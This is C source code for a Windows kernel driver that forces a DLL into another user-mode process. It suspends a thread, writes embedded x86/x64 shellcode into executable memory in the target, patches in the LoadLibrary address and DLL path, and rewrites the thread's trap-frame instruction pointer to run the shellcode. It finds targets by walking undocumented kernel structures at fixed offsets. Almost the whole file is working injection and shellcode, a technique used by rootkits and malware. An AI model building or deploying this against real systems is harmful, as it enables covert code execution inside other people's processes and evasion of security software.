#include "ShitDrv.h"
#include "InjectShellCode.h"
#include "InitializeInjectRelevantInfo.h"
#include "InjectKtrapFrame.h"
#include "InjectInitialize.h"
#include "RiSingShellCode.h"
#include "ObjectHookThread.h"

INJECT_API_LIST g_InjectAplList;
BOOLEAN g_bIsInjectKtrapFrame = FALSE;

NTSTATUS InjectApcRoutine(PINJECT_OBJECT_INFORMATION pInjectObjInfo,PCHAR pShellCode,ULONG ulSize)
{
	NTSTATUS Status;
	KAPC_STATE ApcState;

	if (NULL == pInjectObjInfo)
	{
		return STATUS_INVALID_PARAMETER_1;
	}

	Status = STATUS_UNSUCCESSFUL;
	KeStackAttachProcess(pInjectObjInfo->pInjectProcess,&ApcState);


	KeUnstackDetachProcess(&ApcState);
	return Status;
}
NTSTATUS x86ShellCodeInject(PINJECT_OBJECT_INFORMATION pInjectObjInfo,PCHAR pShellCode,ULONG ulSize)
{
	NTSTATUS Status;
	PINJECT_X86_KTRAP_FRAME pKtrapFrame;
	PCHAR pCharShellCode;
	ULONG uli;
	HANDLE hInjectProcess;
	PVOID pBaseAddress,pTmpPath;
	KAPC_STATE ApcState;
	ULONG_PTR ulRetSize;
//	PCLIENT_ID pClientId;
//	OBJECT_ATTRIBUTES ObjectAttributes;
//	ULONG ulOldProtect;


	pCharShellCode = NULL;
	pBaseAddress = NULL;
	pTmpPath = NULL;

	__try
	{
		g_InjectAplList.StdCallKeSuspendThread(pInjectObjInfo->pInjectThread,NULL);
	}
	__except(1)
	{
		return STATUS_UNSUCCESSFUL;
	}
	pKtrapFrame = *(PINJECT_X86_KTRAP_FRAME *)((ULONG_PTR)pInjectObjInfo->pInjectThread +  \
		g_InjectRelevantOffset.ulOffsetTrapFrame);
	if (MmIsAddressValid(pKtrapFrame) == FALSE)
	{
		if (g_InjectAplList.StdCallKeResumeThread)
		{
			g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
		}
		return STATUS_ADDRESS_NOT_ASSOCIATED;
	}
	do 
	{
		pCharShellCode = ExAllocatePoolWithTag(NonPagedPool,ulSize,'PasP');
	} while (NULL == pCharShellCode);
	RtlZeroMemory(pCharShellCode,ulSize);
	RtlCopyMemory(pCharShellCode,pShellCode,ulSize);
	if (g_InjectAplList.ulLoadLibrary)
	{
		for(uli = (ULONG)pCharShellCode;uli <= (ULONG)pCharShellCode + ulSize;uli++)
		{
			if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_LDR_TAG) 
			{
				RtlCopyMemory((PCHAR)uli,&g_InjectAplList.ulLoadLibrary,sizeof(ULONG));
				break;
			}
		}
	}
	for(uli = (ULONG)pCharShellCode;uli <= (ULONG)pCharShellCode + ulSize;uli++)
	{
		if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_EIP_TAG) 
		{
			*(ULONG*)uli = pKtrapFrame->Eip;
			break;
		}
	}
	//InitializeObjectAttributes(&ObjectAttributes,0,0,0,0);
	//pClientId = (PCLIENT_ID)((ULONG_PTR)pInjectObjInfo->pInjectThread + g_InjectRelevantOffset.ulOffsetCid);
	//if (MmIsAddressValid(pClientId) == FALSE)
	//{
	//	if (g_InjectAplList.StdCallKeResumeThread)
	//	{
	//		g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
	//	}
	//	if (pCharShellCode)
	//	{
	//		ExFreePoolWithTag(pCharShellCode,'PasP');
	//	}
	//	return STATUS_ADDRESS_NOT_ASSOCIATED;
	//}
	Status = ObOpenObjectByPointer(pInjectObjInfo->pInjectProcess, \
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, \
		NULL, \
		PROCESS_ALL_ACCESS, \
		*PsProcessType, \
		KernelMode, \
		&hInjectProcess);
	//Status = ZwOpenProcess(&hInjectProcess,PROCESS_ALL_ACCESS,&ObjectAttributes,pClientId);
	if (NT_ERROR(Status))
	{
		if (pCharShellCode)
		{
			ExFreePoolWithTag(pCharShellCode,'PasP');
		}
		if (g_InjectAplList.StdCallKeResumeThread)
		{
			g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
		}
		return Status;
	}
	if (NT_SUCCESS(Status))
	{
		ulRetSize = ulSize;
		KeStackAttachProcess(pInjectObjInfo->pInjectProcess,&ApcState);
		Status = ZwAllocateVirtualMemory(hInjectProcess,&pBaseAddress,0,&ulRetSize, \
			/*MEM_RESERVE | MEM_COMMIT*/MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		if (NT_ERROR(Status))
		{
			if (pCharShellCode)
			{
				ExFreePoolWithTag(pCharShellCode,'PasP');
			}
			if (hInjectProcess)
			{
				ZwClose(hInjectProcess);
			}
			if (g_InjectAplList.StdCallKeResumeThread)
			{
				g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
			}
			return Status;
		}
		RtlZeroMemory(pBaseAddress,ulRetSize);
		RtlCopyMemory(pBaseAddress,pCharShellCode,ulSize);
		for(uli = (ULONG)pBaseAddress;uli <= (ULONG)pBaseAddress + ulSize;uli++)
		{
			if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_PATH_TAG)
			{
				pTmpPath = (PVOID)uli;
				RtlZeroMemory(pTmpPath,100);
				RtlCopyMemory(pTmpPath,pInjectObjInfo->InjectDllPath,strlen(pInjectObjInfo->InjectDllPath));
				break;
			}
		}
		//for(uli = (ULONG)pBaseAddress;uli <= (ULONG)pBaseAddress + ulSize;uli++)
		//{
		//	if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_PARAMETERS)
		//	{
		//		RtlCopyMemory((PCHAR)uli,&pTmpPath,sizeof(ULONG));
		//		break;
		//	}
		//}
		//Status = g_InjectAplList.StdCallNtProtectVirtualMemory(hInjectProcess, \
		//	&pBaseAddress, \
		//	ulRetSize, \
		//	PAGE_EXECUTE_READ, \
		//	&ulOldProtect);
		//if (NT_SUCCESS(Status))
		//{
		//}
		KeUnstackDetachProcess(&ApcState);
		if (MmIsAddressValid((PVOID)pKtrapFrame->Eip))
		{
			pKtrapFrame->Eip = (ULONG)pBaseAddress;
		}
	}
	if (hInjectProcess)
	{
		ZwClose(hInjectProcess);
	}
	if (g_InjectAplList.StdCallKeResumeThread)
	{
		g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
	}
	if (pCharShellCode)
	{
		ExFreePoolWithTag(pCharShellCode,'PasP');
	}
	return STATUS_SUCCESS;
}

NTSTATUS x64ShellCodeInject(PINJECT_OBJECT_INFORMATION pInjectObjInfo,PCHAR pShellCode,ULONG ulSize)
{
	NTSTATUS Status;
	PINJECT_X64_KTRAP_FRAME pKtrapFrame;
	PCHAR pCharShellCode;
	ULONG64 uli;
	HANDLE hInjectProcess;
	PVOID pBaseAddress,pTmpPath;
	KAPC_STATE ApcState;
	ULONG_PTR ulRetSize;

	pCharShellCode = NULL;
	pBaseAddress = NULL;
	pTmpPath = NULL;

	__try
	{
		g_InjectAplList.FastCallKeSuspendThread(pInjectObjInfo->pInjectThread,NULL);
	}
	__except(1)
	{
		return STATUS_UNSUCCESSFUL;
	}
	pKtrapFrame = *(PINJECT_X64_KTRAP_FRAME *)((ULONG_PTR)pInjectObjInfo->pInjectThread +  \
		g_InjectRelevantOffset.ulOffsetTrapFrame);
	if (MmIsAddressValid(pKtrapFrame) == FALSE)
	{
		if (g_InjectAplList.FastCallKeResumeThread)
		{
			g_InjectAplList.FastCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
		}
		return STATUS_ADDRESS_NOT_ASSOCIATED;
	}
	do 
	{
		pCharShellCode = ExAllocatePoolWithTag(NonPagedPool,ulSize,'PasP');
	} while (NULL == pCharShellCode);
	RtlZeroMemory(pCharShellCode,ulSize);
	RtlCopyMemory(pCharShellCode,pShellCode,ulSize);
	if (g_InjectAplList.ulLoadLibrary)
	{
		for(uli = (ULONG64)pCharShellCode;uli <= (ULONG64)pCharShellCode + ulSize;uli++)
		{
			if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_LDR_TAG) 
			{
				RtlCopyMemory((PCHAR)uli,&g_InjectAplList.ulLoadLibrary,sizeof(ULONG64));
				break;
			}
		}
	}
	for(uli = (ULONG64)pCharShellCode;uli <= (ULONG64)pCharShellCode + ulSize;uli++)
	{
		if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_EIP_TAG) 
		{
			*(ULONG64*)uli = pKtrapFrame->Rip;
			break;
		}
	}
	Status = ObOpenObjectByPointer(pInjectObjInfo->pInjectProcess, \
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, \
		NULL, \
		PROCESS_ALL_ACCESS, \
		*PsProcessType, \
		KernelMode, \
		&hInjectProcess);
	if (NT_ERROR(Status))
	{
		if (pCharShellCode)
		{
			ExFreePoolWithTag(pCharShellCode,'PasP');
		}
		if (g_InjectAplList.FastCallKeResumeThread)
		{
			g_InjectAplList.FastCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
		}
		return Status;
	}
	if (NT_SUCCESS(Status))
	{
		ulRetSize = ulSize;
		KeStackAttachProcess(pInjectObjInfo->pInjectProcess,&ApcState);
		Status = ZwAllocateVirtualMemory(hInjectProcess,&pBaseAddress,0,&ulRetSize, \
			/*MEM_RESERVE | MEM_COMMIT*/MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		if (NT_ERROR(Status))
		{
			if (pCharShellCode)
			{
				ExFreePoolWithTag(pCharShellCode,'PasP');
			}
			if (hInjectProcess)
			{
				ZwClose(hInjectProcess);
			}
			if (g_InjectAplList.FastCallKeResumeThread)
			{
				g_InjectAplList.FastCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
			}
			return Status;
		}
		RtlZeroMemory(pBaseAddress,ulRetSize);
		RtlCopyMemory(pBaseAddress,pCharShellCode,ulSize);
		for(uli = (ULONG64)pBaseAddress;uli <= (ULONG64)pBaseAddress + ulSize;uli++)
		{
			if (*(ULONG*)uli == X86_INJECT_KTRAP_FRAME_PATH_TAG)
			{
				pTmpPath = (PVOID)uli;
				RtlZeroMemory(pTmpPath,100);
				RtlCopyMemory(pTmpPath,pInjectObjInfo->InjectDllPath,strlen(pInjectObjInfo->InjectDllPath));
				break;
			}
		}
		//for(uli = (ULONG_PTR)pBaseAddress;uli <= (ULONG_PTR)pBaseAddress + ulSize;uli++)
		//{
		//	if (*(ULONG*)uli == X64_INJECT_KTRAP_FRAME_PARAMETERS)
		//	{
		//		RtlCopyMemory((PCHAR)uli,&pTmpPath,sizeof(ULONG_PTR));
		//		break;
		//	}
		//}
		KeUnstackDetachProcess(&ApcState);
		if (pKtrapFrame->Rip)
		{
			pKtrapFrame->Rip = (ULONG)pBaseAddress;
		}
	}
	if (hInjectProcess)
	{
		ZwClose(hInjectProcess);
	}
	if (g_InjectAplList.FastCallKeResumeThread)
	{
		g_InjectAplList.FastCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
	}
	if (pCharShellCode)
	{
		ExFreePoolWithTag(pCharShellCode,'PasP');
	}
	return STATUS_SUCCESS;
}
unsigned char g_x86InjectShellCode[101] = {
	0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x83, 0xED, 0x06, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x8D, 
	0x8D, 0x21, 0x00, 0x00, 0x00, 0x51, 0xFF, 0xD0, 0x61, 0xEA, 0x40, 0x40, 0x40, 0x40, 0x1B, 0x00, 
	0xC3, 0x80, 0x80, 0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00
};
unsigned char g_x64InjectShellCode[196] = {
	0x90, 0x90, 0x50, 0x51, 0x41, 0x57, 0x55, 0x48, 0x89, 0xE5, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 
	0x5F, 0x49, 0x83, 0xEF, 0x0F, 0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 
	0x8D, 0x8F, 0x3C, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x59, 0x58, 
	0x48, 0xB9, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0xFF, 0xE1, 0x80, 0x80, 0x80, 0x80, 
	0x80, 0x80, 0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00
};
NTSTATUS InjectShellCode(PINJECT_OBJECT_INFORMATION pInjectObjInfo)
{
	NTSTATUS Status;

	if (NULL == pInjectObjInfo)
	{
		return STATUS_INVALID_PARAMETER_1;
	}
	if (NULL == pInjectObjInfo->pInjectProcess &&  \
		NULL == pInjectObjInfo->pInjectThread)
	{
		return STATUS_INVALID_PARAMETER_1;
	}
	if (g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
	{
		Status = x64ShellCodeInject(pInjectObjInfo, \
			(PCHAR)g_x64InjectShellCode, \
			196);
		if (NT_SUCCESS(Status))
		{
			return Status;
		}
		if (NT_ERROR(Status))
		{
			return Status;
		}
	}
	else
	{
		Status = x86ShellCodeInject(pInjectObjInfo, \
			(PCHAR)g_x86InjectShellCode, \
			101);
		if (NT_SUCCESS(Status))
		{
			return Status;
		}
		if (NT_ERROR(Status))
		{
			return Status;
		}
	}
	return Status;
}
NTSTATUS InjectKtrapFrame(PINJECT_PROCESS_INFORMATION pInjectProcessInfo,PCHAR pDllPath)
{
	NTSTATUS Status;
	PINJECT_OBJECT_INFORMATION pInjectObjInfo;

	//DbgBreakPoint();
	pInjectObjInfo = NULL;
	Status = STATUS_SUCCESS;

	if (NULL == pInjectProcessInfo && \
		NULL == pDllPath)
	{
		return STATUS_INVALID_PARAMETER_1 | STATUS_INVALID_PARAMETER_2;
	}
	if (InitializeInjectInformation(&g_InjectRelevantOffset) == FALSE)
	{
		return STATUS_UNSUCCESSFUL;
	}
	pInjectObjInfo = FindInjectThread(pInjectProcessInfo);
	if (NULL == pInjectObjInfo)
	{
		if (pInjectObjInfo)
		{
			ExFreePoolWithTag(pInjectObjInfo,'PasP');
		}
		return STATUS_THREAD_NOT_IN_PROCESS;
	}
	if (InitializeInjectDllPath(pInjectObjInfo,pDllPath) == FALSE)
	{
		if (pInjectObjInfo)
		{
			ExFreePoolWithTag(pInjectObjInfo,'PasP');
		}
		return STATUS_UNSUCCESSFUL;
	}
	if (g_InjectAplList.bInitialize == FALSE)
	{
		if (InitializeInjectApiList(pInjectObjInfo,&g_InjectAplList) == FALSE)
		{
			if (pInjectObjInfo)
			{
				ExFreePoolWithTag(pInjectObjInfo,'PasP');
			}
			return STATUS_UNSUCCESSFUL;
		}
	}
	Status = InjectShellCode(pInjectObjInfo);
	if (NT_SUCCESS(Status))
	{
	}
	if (pInjectObjInfo)
	{
		ExFreePoolWithTag(pInjectObjInfo,'PasP');
	}
	return Status;
}
PINJECT_OBJECT_INFORMATION FindInjectThread(PINJECT_PROCESS_INFORMATION pInjectProcessInfo)
{
	PVOID pCurProc;
	PVOID pCurThread;
	PVOID pTeb;
	PVOID pActivationContextStackPointer;
	UCHAR SuspendCount;
	ULONG ulCrossThreadFlags;
	PINJECT_OBJECT_INFORMATION pInjectObjectInfo;
	NTSTATUS Status;
	KAPC_STATE ApcState;
	BOOLEAN bFindProcess;

	PLIST_ENTRY pCurListEntry,pCurThreadList;
	PLIST_ENTRY pListHead,pThreadHead;

	Status = STATUS_UNSUCCESSFUL;
	pTeb = NULL;
	pActivationContextStackPointer = NULL;
	bFindProcess = FALSE;

	do 
	{
		pInjectObjectInfo = ExAllocatePoolWithTag(NonPagedPool,sizeof(INJECT_OBJECT_INFORMATION),'PasP');
	} while (NULL == pInjectObjectInfo);
	RtlZeroMemory(pInjectObjectInfo,sizeof(INJECT_OBJECT_INFORMATION));
	if (pInjectProcessInfo->ulPid > 4)
	{
		Status = PsLookupProcessByProcessId((HANDLE)pInjectProcessInfo->ulPid,(PEPROCESS*)&pCurProc);
		if (NT_SUCCESS(Status))
		{
			bFindProcess = TRUE;
		}
	}
	else
	{
		if (NULL == pInjectProcessInfo)
		{
			if (pInjectProcessInfo)
			{
				ExFreePoolWithTag(pInjectObjectInfo,'PasP');
			}
			return NULL;
		}
		pCurProc = IoGetCurrentProcess();
		pListHead = pCurListEntry = (PLIST_ENTRY)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetFlink);
		do 
		{
			pCurProc = (PVOID)((ULONG_PTR)pCurListEntry - g_InjectRelevantOffset.ulOffsetFlink);
			if (_strnicmp((char *)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetName), \
				pInjectProcessInfo->pInjectProcessName, \
				strlen(pInjectProcessInfo->pInjectProcessName))  == 0)
			{
				bFindProcess = TRUE;
				break;
			}
			pCurListEntry = pCurListEntry->Flink;
		} while (pCurListEntry != pListHead);
	}
	if (bFindProcess)
	{
		pThreadHead = (PVOID)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetThreadListHead);
		pCurThreadList = pThreadHead->Flink;
		KeStackAttachProcess(pCurProc,&ApcState);
		while (pThreadHead != pCurThreadList)
		{
			pCurThread = (PVOID)((ULONG_PTR)pCurThreadList - g_InjectRelevantOffset.ulOffsetThreadListEntry);
			SuspendCount = *(UCHAR*)((ULONG_PTR)pCurThread + g_InjectRelevantOffset.ulOffsetSuspendCount);
			ulCrossThreadFlags = *(ULONG*)((ULONG_PTR)pCurThread + g_InjectRelevantOffset.ulOffsetCrossThreadFlags);
			pTeb = (PVOID)*(ULONG_PTR *)((ULONG_PTR)pCurThread + g_InjectRelevantOffset.ulOffsetTeb);
			if (NULL == pTeb)
			{
				pCurThreadList = pCurThreadList->Flink;
				continue;
			}
			if (!SuspendCount &&  \
				(ulCrossThreadFlags & PS_CROSS_THREAD_FLAGS_SYSTEM) == 0)
			{
				if (g_InjectRelevantOffset.WindowsVersion.bIsWindowsXp && \
					FALSE == g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
				{
					pInjectObjectInfo->pInjectProcess = pCurProc;
					pInjectObjectInfo->pInjectThread = pCurThread;
					if (NT_SUCCESS(Status))
					{
						ObDereferenceObject(pCurProc);
					}
					KeUnstackDetachProcess(&ApcState);
					return pInjectObjectInfo;
				}
				else
				{
					pActivationContextStackPointer = (PVOID)*(ULONG_PTR *)((ULONG_PTR)pTeb +  \
						g_InjectRelevantOffset.ulOffsetActivationContextStackPointer);
					if (pActivationContextStackPointer)
					{
						pInjectObjectInfo->pInjectProcess = pCurProc;
						pInjectObjectInfo->pInjectThread = pCurThread;
						if (NT_SUCCESS(Status))
						{
							ObDereferenceObject(pCurProc);
						}
						KeUnstackDetachProcess(&ApcState);
						return pInjectObjectInfo;
					}
				}
			}
			pCurThreadList = pCurThreadList->Flink;
		}
		KeUnstackDetachProcess(&ApcState);
		if (NT_SUCCESS(Status))
		{
			ObDereferenceObject(pCurProc);
		}
	}
	if (pInjectObjectInfo)
	{
		ExFreePoolWithTag(pInjectObjectInfo,'PasP');
	}
	return NULL;
}
NTSTATUS IsWindows64Bits(PVOID pCurProcess)
{
	NTSTATUS Status;
	HANDLE hProcess;
	ULONG_PTR ulIsWow64Process;
	ULONG ulRetLength;

	ulIsWow64Process = 0;
	Status = ObOpenObjectByPointer(pCurProcess,OBJ_KERNEL_HANDLE,NULL,PROCESS_ALL_ACCESS,NULL,KernelMode,&hProcess);
	if (NT_ERROR(Status))
	{
		return Status;
	}
	Status = ZwQueryInformationProcess(hProcess,ProcessWow64Information,&ulIsWow64Process,sizeof(ULONG_PTR),&ulRetLength);
	if (NT_ERROR(Status))
	{
		return Status;
	}
	if (ulIsWow64Process)
	{
		return 0x64;
	}
	else
	{
		return 0x86;
	}
	return Status;
}